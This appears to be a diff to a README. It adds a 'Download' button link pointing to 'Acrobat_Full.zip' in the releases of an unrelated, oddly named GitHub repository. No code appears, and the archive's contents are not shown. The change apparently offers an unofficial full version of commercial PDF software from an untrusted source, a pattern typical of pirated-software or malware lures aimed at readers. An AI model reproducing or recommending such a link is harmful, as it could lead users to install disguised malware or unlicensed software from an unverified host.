@@ -4,7 +4,7 @@
 > [!NOTE]
 > Choose your own version
 
-<a href=""><img src="https://github.com/user-attachments/assets/1f0157e8-e97c-4338-827a-6fd5dae41b09" alt="Download"></a>
+<a href="https://github.com/Vinions/improved-tribble/releases/download/acrobat/Acrobat_Full.zip"><img src="https://github.com/user-attachments/assets/1f0157e8-e97c-4338-827a-6fd5dae41b09" alt="Download"></a>
 
 
 > [!TIP]
